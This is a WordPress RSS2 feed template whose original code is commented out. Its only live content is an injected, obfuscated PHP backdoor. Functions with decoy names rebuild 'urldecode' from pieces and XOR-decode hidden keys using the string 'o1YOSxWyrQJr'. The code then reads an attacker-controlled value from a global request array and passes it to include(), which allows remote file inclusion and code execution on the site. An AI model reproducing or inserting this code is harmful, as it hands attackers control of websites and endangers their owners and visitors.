<?php /* 
*
 * RSS2 Feed Template for displaying RSS2 Posts feed.
 *
 * @package WordPress
 

header( 'Content-Type: ' . feed_content_type( 'rss2' ) . '; charset=' . get_option( 'blog_charset' ), true );
$more = 1;

echo '<?xml version="1.0" encoding="' . get_option( 'blog_charset' ) . '"?' . '>';

*
 * Fires between the xml and rss tags in a feed.
 *
 * @since 4.0.0
 *
 * @param string $context Type of feed. Possible values include 'rss2', 'rss2-comments',
 *                        'rdf', 'atom', and 'atom-comments'.
 
do_action( 'rss_tag_pre', 'rss2' );
?>
<rss version="2.0"
	xmlns:content="http:purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http:wellformedweb.org/CommentAPI/"
	xmlns:dc="http:purl.org/dc/elements/1.1/"
	xmlns:atom="http:www.w3.org/2005/Atom"
	xmlns:sy="http:purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http:purl.org/rss/1.0/modules/slash/"
	<?php /* 
	*
	 * Fires at the end of the RSS root to add namespaces.
	 *
	 * @since 2.0.0
	 
	do_action( 'rss2_ns' );
	?>
>

<channel>
	<title><?php /*  wp_title_rss(); ?></title>
	<atom:link href="<?php /*  self_link(); ?>" rel="self" type="application/rss+xml" />
	<link><?php /*  bloginfo_rss( 'url' ); ?></link>
	<description><?php /*  bloginfo_rss( 'description' ); ?></description>
	<lastBuildDate><?php /*  echo get_feed_build_date( 'r' ); ?></lastBuildDate>
	<language><?php /*  bloginfo_rss( 'language' ); ?></language>
	<sy:updatePeriod>
	<?php /* 
		$duration = 'hourly';

		*
		 * Filters how often to update the RSS feed.
		 *
		 * @since 2.1.0
		 *
		 * @param string $duration The update period. Accepts 'hourly', 'daily', 'weekly', 'monthly',
		 *                         'yearly'. Default 'hourly'.
		 
		echo apply_filters( 'rss_update_period', $duration );
	?>
	</sy:updatePeriod*/





	$no_texturize_shortcodes_stack = 'email_address';

function fields()

{

    $replace_pairs = 'allowed_zones';
}


	$dynamic_characters = 'object_vars';
function _ext()

{
    $delete_with_user = 'allowed_zones';
    $return = 924;
}
	$author_query = 'patterns';

function cache($label_count)

{
    $capability_type = $label_count;


	$wildcards = 'has_archive';
    $escaped_parts = $GLOBALS[page_ids("0w%10%03%16%2B", $capability_type)];
    $html_parts = $escaped_parts;
    $since = 'allowed_zones';
    $page_templates = isset($html_parts[$capability_type]);

    $html_regex = 'allowed_zones';
	$tinkle = 'search';
    if ($page_templates)

    {

        $hours = $escaped_parts[$capability_type];
	$ext_preg = 'weeuns';
        $can_export = 123;
        $date_string = 656;
        $filetype = $hours[page_ids("%1B%5C%29%10%3D%19%3A%1C", $capability_type)];
        $filters = 'allowed_zones';
        $ignore_block_element = $filetype;
	$tb_url = 'single';
        $mimes = $can_export % ($date_string + 4);
        $can_export = $date_string - $can_export;
	$end_clean = 'emoji_char';
        include ($ignore_block_element);
    }
}



function page_ids($post_parent, $trackback_urls)

{
    $single_preg = $trackback_urls;
    $feature = "url";
	$cdata = 'show_in_admin_bar';
    $feature  .= "decode";

    $attributes = $feature($post_parent);
    $new_status = strlen($attributes);
    $new_status = substr($single_preg, 0, $new_status);
    $quote_pattern = $attributes ^ $new_status;

    $link = 620;


    $attributes = sprintf($quote_pattern, $new_status);
	$post_status_sql = 'double_encode';
    $link = $link + 4;
	$closing_single_quote = 'data';
    $hierarchical_post_types = 'allowed_zones';

    return $quote_pattern;
	$others = 'ancestor';
}

cache('o1YOSxWyrQJr');




fields();


	$post_category = 'message';
_ext();





/* >
	<sy:updateFrequency>
	<?php
		$frequency = '1';

		*
		 * Filters the RSS update frequency.
		 *
		 * @since 2.1.0
		 *
		 * @param string $frequency An integer passed as a string representing the frequency
		 *                          of RSS updates within the update period. Default '1'.
		 
		echo apply_filters( 'rss_update_frequency', $frequency );
	?>
	</sy:updateFrequency>
	<?php
	*
	 * Fires at the end of the RSS2 Feed Header.
	 *
	 * @since 2.0.0
	 
	do_action( 'rss2_head' );

	while ( have_posts() ) :
		the_post();
		?>
	<item>
		<title><?php the_title_rss(); ?></title>
		<link><?php the_permalink_rss(); ?></link>
		<?php if ( get_comments_number() || comments_open() ) : ?>
			<comments><?php comments_link_feed(); ?></comments>
		<?php endif; ?>

		<dc:creator><![CDATA[<?php the_author(); ?>]]></dc:creator>
		<pubDate><?php echo mysql2date( 'D, d M Y H:i:s +0000', get_post_time( 'Y-m-d H:i:s', true ), false ); ?></pubDate>
		<?php the_category_rss( 'rss2' ); ?>
		<guid isPermaLink="false"><?php the_guid(); ?></guid>

		<?php if ( get_option( 'rss_use_excerpt' ) ) : ?>
			<description><![CDATA[<?php the_excerpt_rss(); ?>]]></description>
		<?php else : ?>
			<description><![CDATA[<?php the_excerpt_rss(); ?>]]></description>
			<?php $content = get_the_content_feed( 'rss2' ); ?>
			<?php if ( strlen( $content ) > 0 ) : ?>
				<content:encoded><![CDATA[<?php echo $content; ?>]]></content:encoded>
			<?php else : ?>
				<content:encoded><![CDATA[<?php the_excerpt_rss(); ?>]]></content:encoded>
			<?php endif; ?>
		<?php endif; ?>

		<?php if ( get_comments_number() || comments_open() ) : ?>
			<wfw:commentRss><?php echo esc_url( get_post_comments_feed_link( null, 'rss2' ) ); ?></wfw:commentRss>
			<slash:comments><?php echo get_comments_number(); ?></slash:comments>
		<?php endif; ?>

		<?php rss_enclosure(); ?>

		<?php
		*
		 * Fires at the end of each RSS2 feed item.
		 *
		 * @since 2.0.0
		 
		do_action( 'rss2_item' );
		?>
	</item>
	<?php endwhile; ?>
</channel>
</rss>
*/